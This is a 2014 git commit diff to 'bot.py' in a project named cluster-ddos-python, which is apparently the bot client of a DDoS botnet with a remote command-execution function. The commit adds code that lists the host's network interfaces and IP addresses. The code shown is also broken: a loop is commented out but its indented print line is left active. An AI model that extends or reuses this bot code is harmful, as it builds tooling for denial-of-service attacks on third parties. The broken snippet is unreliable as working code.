b5651ee495bcfdfe54f60351ce3fcf15ad2af46e
lofyer <lofyer@gmail.com>
2014-08-22 00:11:12 +0800

    模板尚未完成

--- cluster-ddos-python/bot.py
+++ cluster-ddos-python/bot.py
@@ -1,5 +1,5 @@
 #!/usr/bin/python
-import socket, os, subprocess, sys, time, logging
+import socket, os, subprocess, sys, time, logging, fcntl, struct, array
 from daemon import Daemon
 
 logger=logging.getLogger('ddos')
@@ -9,6 +9,33 @@ logfd.setLevel(logging.DEBUG)
 formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
 logfd.setFormatter(formatter)
 logger.addHandler(logfd)
+
+def all_interfaces():
+	max_possible = 128  # arbitrary. raise if needed.
+	bytes = max_possible * 32
+	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	names = array.array('B', '\0' * bytes)
+	outbytes = struct.unpack('iL', fcntl.ioctl(s.fileno(),0x8912,  # SIOCGIFCONF
+			struct.pack('iL', bytes, names.buffer_info()[0])
+			))[0]
+	namestr = names.tostring()
+	lst = []
+	for i in range(0, outbytes, 40):
+		name = namestr[i:i+16].split('\0', 1)[0]
+		ip = namestr[i+20:i+24]
+		if name.startswith('eth'):
+			lst.append((name, ip))
+	return lst
+
+def format_ip(addr):
+	return str(ord(addr[0])) + '.' + \
+	str(ord(addr[1])) + '.' + \
+	str(ord(addr[2])) + '.' + \
+	str(ord(addr[3]))
+
+#ifs = all_interfaces()
+#for i in ifs:
+	print "%12s   %s" % (i[0], format_ip(i[1]))
 
 def excute_cmd(cmd):
 	if cmd == "test":
